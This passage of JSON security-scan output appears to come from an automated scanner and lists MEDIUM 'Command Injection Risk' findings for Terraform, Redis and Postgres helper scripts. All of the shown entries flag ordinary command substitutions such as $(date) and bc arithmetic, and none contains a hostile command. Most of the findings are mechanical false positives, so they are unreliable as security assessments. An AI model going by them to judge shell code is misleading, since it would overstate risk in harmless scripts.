      "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
      "line_number": 329,
      "issue": "Command substitution in shell",
      "evidence": "elif (( $(echo \"$diff < 0\" | bc -l) )); then",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
      "line_number": 403,
      "issue": "Command substitution in shell",
      "evidence": "output=$(cat infracost.json)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
      "line_number": 406,
      "issue": "Command substitution in shell",
      "evidence": "output=$(format_csv)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
      "line_number": 409,
      "issue": "Command substitution in shell",
      "evidence": "output=$(format_table)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
      "line_number": 412,
      "issue": "Command substitution in shell",
      "evidence": "output=\"$output$(echo)$(compare_estimates)\"",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
      "line_number": 430,
      "issue": "Command substitution in shell",
      "evidence": "local monthly_cost=$(jq -r '.totalMonthlyCost' infracost.json | cut -d. -f1)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
      "line_number": 29,
      "issue": "Command substitution in shell",
      "evidence": "Usage: $(basename \"$0\") [OPTIONS]",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
      "line_number": 46,
      "issue": "Command substitution in shell",
      "evidence": "$(basename \"$0\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
      "line_number": 49,
      "issue": "Command substitution in shell",
      "evidence": "$(basename \"$0\") --pattern cache",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
      "line_number": 52,
      "issue": "Command substitution in shell",
      "evidence": "$(basename \"$0\") --json",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
      "line_number": 55,
      "issue": "Command substitution in shell",
      "evidence": "$(basename \"$0\") --host redis.example.com --port 6380 --password secret",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
      "line_number": 174,
      "issue": "Command substitution in shell",
      "evidence": "local start_time=$(date +%s.%N)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
      "line_number": 188,
      "issue": "Command substitution in shell",
      "evidence": "local retrieved=$($REDIS_CMD GET \"$key\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
      "line_number": 196,
      "issue": "Command substitution in shell",
      "evidence": "local ttl=$($REDIS_CMD TTL \"$key\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
      "line_number": 209,
      "issue": "Command substitution in shell",
      "evidence": "local exists=$($REDIS_CMD EXISTS \"$key\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
      "line_number": 218,
      "issue": "Command substitution in shell",
      "evidence": "local end_time=$(date +%s.%N)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
      "line_number": 219,
      "issue": "Command substitution in shell",
      "evidence": "local duration=$(echo \"$end_time - $start_time\" | bc)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
      "line_number": 229,
      "issue": "Command substitution in shell",
      "evidence": "local start_time=$(date +%s.%N)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
      "line_number": 244,
      "issue": "Command substitution in shell",
      "evidence": "local length=$($REDIS_CMD LLEN \"$queue\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
      "line_number": 255,
      "issue": "Command substitution in shell",
      "evidence": "local item=$($REDIS_CMD RPOP \"$queue\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
      "line_number": 276,
      "issue": "Command substitution in shell",
      "evidence": "local task=$($REDIS_CMD RPOPLPUSH \"$pending_queue\" \"$processing_queue\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
      "line_number": 286,
      "issue": "Command substitution in shell",
      "evidence": "local end_time=$(date +%s.%N)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
      "line_number": 287,
      "issue": "Command substitution in shell",
      "evidence": "local duration=$(echo \"$end_time - $start_time\" | bc)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
      "line_number": 297,
      "issue": "Command substitution in shell",
      "evidence": "local start_time=$(date +%s.%N)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
      "line_number": 306,
      "issue": "Command substitution in shell",
      "evidence": "local subscribers=$($REDIS_CMD PUBLISH \"$channel\" \"test message\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
      "line_number": 328,
      "issue": "Command substitution in shell",
      "evidence": "local end_time=$(date +%s.%N)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
      "line_number": 329,
      "issue": "Command substitution in shell",
      "evidence": "local duration=$(echo \"$end_time - $start_time\" | bc)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
      "line_number": 339,
      "issue": "Command substitution in shell",
      "evidence": "local start_time=$(date +%s.%N)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
      "line_number": 346,
      "issue": "Command substitution in shell",
      "evidence": "local acquired=$($REDIS_CMD SET \"$lock_key\" \"$lock_value\" NX EX 10)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
      "line_number": 354,
      "issue": "Command substitution in shell",
      "evidence": "local reacquired=$($REDIS_CMD SET \"$lock_key\" \"other-token\" NX EX 10)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
      "line_number": 363,
      "issue": "Command substitution in shell",
      "evidence": "local exists=$($REDIS_CMD EXISTS \"$lock_key\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
      "line_number": 372,
      "issue": "Command substitution in shell",
      "evidence": "local released=$($REDIS_CMD EVAL \"$lua_script\" 1 \"$lock_key\" \"$lock_value\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
      "line_number": 383,
      "issue": "Command substitution in shell",
      "evidence": "local end_time=$(date +%s.%N)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
      "line_number": 384,
      "issue": "Command substitution in shell",
      "evidence": "local duration=$(echo \"$end_time - $start_time\" | bc)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
      "line_number": 394,
      "issue": "Command substitution in shell",
      "evidence": "local start_time=$(date +%s.%N)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
      "line_number": 401,
      "issue": "Command substitution in shell",
      "evidence": "if ! $REDIS_CMD ZADD \"$leaderboard\" $((i * 100)) \"player:$i\" > /dev/null; then",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
      "line_number": 409,
      "issue": "Command substitution in shell",
      "evidence": "local top_3=$($REDIS_CMD ZREVRANGE \"$leaderboard\" 0 2 WITHSCORES)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
      "line_number": 418,
      "issue": "Command substitution in shell",
      "evidence": "local rank=$($REDIS_CMD ZREVRANK \"$leaderboard\" \"player:5\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
      "line_number": 427,
      "issue": "Command substitution in shell",
      "evidence": "local score=$($REDIS_CMD ZSCORE \"$leaderboard\" \"player:5\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
      "line_number": 445,
      "issue": "Command substitution in shell",
      "evidence": "local end_time=$(date +%s.%N)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
      "line_number": 446,
      "issue": "Command substitution in shell",
      "evidence": "local duration=$(echo \"$end_time - $start_time\" | bc)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
      "line_number": 456,
      "issue": "Command substitution in shell",
      "evidence": "local start_time=$(date +%s.%N)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
      "line_number": 465,
      "issue": "Command substitution in shell",
      "evidence": "local current=$($REDIS_CMD INCR \"$rate_key\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
      "line_number": 484,
      "issue": "Command substitution in shell",
      "evidence": "local now=$(date +%s)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
      "line_number": 489,
      "issue": "Command substitution in shell",
      "evidence": "$REDIS_CMD ZADD \"$window_key\" $((now + i)) \"req:$i\" > /dev/null",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
      "line_number": 493,
      "issue": "Command substitution in shell",
      "evidence": "$REDIS_CMD ZREMRANGEBYSCORE \"$window_key\" 0 $((now - window)) > /dev/null",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
      "line_number": 496,
      "issue": "Command substitution in shell",
      "evidence": "local window_count=$($REDIS_CMD ZCARD \"$window_key\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
      "line_number": 506,
      "issue": "Command substitution in shell",
      "evidence": "local end_time=$(date +%s.%N)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
      "line_number": 507,
      "issue": "Command substitution in shell",
      "evidence": "local duration=$(echo \"$end_time - $start_time\" | bc)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/postgres-migrations/resources/scripts/test_migration.sh",
      "line_number": 35,
      "issue": "Command substitution in shell",
      "evidence": "DB_PORT=$((5432 + (RANDOM % 1000)))",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/postgres-migrations/resources/scripts/test_migration.sh",
      "line_number": 48,
      "issue": "Command substitution in shell",
      "evidence": "echo -e \"${GREEN}[$(date +'%H:%M:%S')]${NC} $*\"",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/postgres-migrations/resources/scripts/test_migration.sh",
      "line_number": 222,
      "issue": "Command substitution in shell",
      "evidence": "-v \"$(pwd)/$MIGRATIONS_DIR:/flyway/sql\" \\",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/postgres-migrations/resources/scripts/test_migration.sh",
      "line_number": 233,
      "issue": "Command substitution in shell",
      "evidence": "count=$(run_psql -t -c \"SELECT COUNT(*) FROM flyway_schema_history WHERE success = true;\" | tr -d ' ')",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/postgres-migrations/resources/scripts/test_migration.sh",
      "line_number": 258,
      "issue": "Command substitution in shell",
      "evidence": "version=$(migrate -database \"$db_url\" -path \"$MIGRATIONS_DIR\" version 2>&1 || echo \"unknown\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/postgres-migrations/resources/scripts/test_migration.sh",
      "line_number": 348,
      "issue": "Command substitution in shell",
      "evidence": "tables=$(run_psql -t -c \"SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = 'public';\" | tr -d ' ')",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/postgres-migrations/resources/scripts/test_migration.sh",
      "line_number": 355,
      "issue": "Command substitution in shell",
      "evidence": "invalid_indexes=$(run_psql -t -c \"SELECT COUNT(*) FROM pg_index WHERE NOT indisvalid;\" | tr -d ' ')",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/postgres-migrations/resources/scripts/test_migration.sh",
      "line_number": 372,
      "issue": "Command substitution in shell",
      "evidence": "echo -n \"\\\"passed\\\":$(printf '%s\\n' \"${TEST_RESULTS[@]}\" | grep -c '\"status\":\"passed\"'),\"",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/postgres-migrations/resources/scripts/test_migration.sh",
      "line_number": 373,
      "issue": "Command substitution in shell",
      "evidence": "echo -n \"\\\"failed\\\":$(printf '%s\\n' \"${TEST_RESULTS[@]}\" | grep -c '\"status\":\"failed\"' || echo 0)\"",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/postgres-migrations/resources/scripts/test_migration.sh",
      "line_number": 382,
      "issue": "Command substitution in shell",
      "evidence": "echo \"Passed: $(printf '%s\\n' \"${TEST_RESULTS[@]}\" | grep -c '\"status\":\"passed\"')\"",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/postgres-migrations/resources/scripts/test_migration.sh",
      "line_number": 383,
      "issue": "Command substitution in shell",
      "evidence": "echo \"Failed: $(printf '%s\\n' \"${TEST_RESULTS[@]}\" | grep -c '\"status\":\"failed\"' || echo 0)\"",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/postgres-migrations/resources/scripts/test_migration.sh",
      "line_number": 384,
      "issue": "Command substitution in shell",
      "evidence": "echo \"Warnings: $(printf '%s\\n' \"${TEST_RESULTS[@]}\" | grep -c '\"status\":\"warning\"' || echo 0)\"",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/postgres-migrations/resources/scripts/test_migration.sh",
      "line_number": 435,
      "issue": "Command substitution in shell",
      "evidence": "TOOL=$(detect_migration_tool \"$MIGRATIONS_DIR\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/postgres-migrations/resources/scripts/test_migration.sh",
      "line_number": 475,
      "issue": "Command substitution in shell",
      "evidence": "failed_count=$(printf '%s\\n' \"${TEST_RESULTS[@]}\" | grep -c '\"status\":\"failed\"' || echo 0)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
      "line_number": 35,
      "issue": "Command substitution in shell",
      "evidence": "$(basename \"$0\") --query \"SELECT ...\" [OPTIONS]",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
      "line_number": 36,
      "issue": "Command substitution in shell",
      "evidence": "$(basename \"$0\") --query-file queries.sql [OPTIONS]",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
      "line_number": 37,
      "issue": "Command substitution in shell",
      "evidence": "$(basename \"$0\") --compare before.sql after.sql [OPTIONS]",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
      "line_number": 52,
      "issue": "Command substitution in shell",
      "evidence": "$(basename \"$0\") --query \"SELECT * FROM users WHERE id = 123\"",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
      "line_number": 55,
      "issue": "Command substitution in shell",
      "evidence": "$(basename \"$0\") --query-file queries.sql --iterations 20",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
      "line_number": 58,
      "issue": "Command substitution in shell",
      "evidence": "$(basename \"$0\") --compare slow_query.sql fast_query.sql",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
      "line_number": 61,
      "issue": "Command substitution in shell",
      "evidence": "$(basename \"$0\") --query \"SELECT COUNT(*) FROM orders\" --json",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
      "line_number": 141,
      "issue": "Command substitution in shell",
      "evidence": "local start=$(date +%s%N)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
      "line_number": 143,
      "issue": "Command substitution in shell",
      "evidence": "local exec_time=$(cat /tmp/bench_time_$$.txt)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
      "line_number": 160,
      "issue": "Command substitution in shell",
      "evidence": "sum=$(echo \"$sum + $time\" | bc)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
      "line_number": 161,
      "issue": "Command substitution in shell",
      "evidence": "if (( $(echo \"$time < $min\" | bc -l) )); then",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
      "line_number": 164,
      "issue": "Command substitution in shell",
      "evidence": "if (( $(echo \"$time > $max\" | bc -l) )); then",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
      "line_number": 169,
      "issue": "Command substitution in shell",
      "evidence": "local mean=$(echo \"scale=3; $sum / ${#times[@]}\" | bc)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
      "line_number": 172,
      "issue": "Command substitution in shell",
      "evidence": "IFS=$'\\n' sorted=($(sort -n <<<\"${times[*]}\"))",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
      "line_number": 176,
      "issue": "Command substitution in shell",
      "evidence": "local mid1=${sorted[$((count/2 - 1))]}",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
      "line_number": 177,
      "issue": "Command substitution in shell",
      "evidence": "local mid2=${sorted[$((count/2))]}",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
      "line_number": 178,
      "issue": "Command substitution in shell",
      "evidence": "median=$(echo \"scale=3; ($mid1 + $mid2) / 2\" | bc)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
      "line_number": 180,
      "issue": "Command substitution in shell",
      "evidence": "median=${sorted[$((count/2))]}",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
      "line_number": 186,
      "issue": "Command substitution in shell",
      "evidence": "local diff=$(echo \"$time - $mean\" | bc)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
      "line_number": 187,
      "issue": "Command substitution in shell",
      "evidence": "local squared=$(echo \"$diff * $diff\" | bc)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
      "line_number": 188,
      "issue": "Command substitution in shell",
      "evidence": "variance_sum=$(echo \"$variance_sum + $squared\" | bc)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
      "line_number": 190,
      "issue": "Command substitution in shell",
      "evidence": "local variance=$(echo \"scale=3; $variance_sum / ${#times[@]}\" | bc)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
      "line_number": 191,
      "issue": "Command substitution in shell",
      "evidence": "local stddev=$(echo \"scale=3; sqrt($variance)\" | bc)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
      "line_number": 205,
      "issue": "Command substitution in shell",
      "evidence": "\"times\": [$(IFS=,; echo \"${times[*]}\")]",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
      "line_number": 218,
      "issue": "Command substitution in shell",
      "evidence": "local mean=$(echo \"$results\" | jq -r '.mean_ms')",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
      "line_number": 219,
      "issue": "Command substitution in shell",
      "evidence": "local median=$(echo \"$results\" | jq -r '.median_ms')",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
      "line_number": 220,
      "issue": "Command substitution in shell",
      "evidence": "local min=$(echo \"$results\" | jq -r '.min_ms')",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
      "line_number": 221,
      "issue": "Command substitution in shell",
      "evidence": "local max=$(echo \"$results\" | jq -r '.max_ms')",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
      "line_number": 222,
      "issue": "Command substitution in shell",
      "evidence": "local stddev=$(echo \"$results\" | jq -r '.stddev_ms')",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
      "line_number": 223,
      "issue": "Command substitution in shell",
      "evidence": "local iterations=$(echo \"$results\" | jq -r '.iterations')",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
      "line_number": 246,
      "issue": "Command substitution in shell",
      "evidence": "local results1=$(benchmark_query \"$query1\" \"$ITERATIONS\" \"$WARMUP_RUNS\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/postgres-query-optimization/resources/scripts/benchmark_queries.sh",
      "line_number": 249,
      "issue": "Command substitution in shell",
      "evidence": "local results2=$(benchmark_query \"$query2\" \"$ITERATIONS\" \"$WARMUP_RUNS\")",
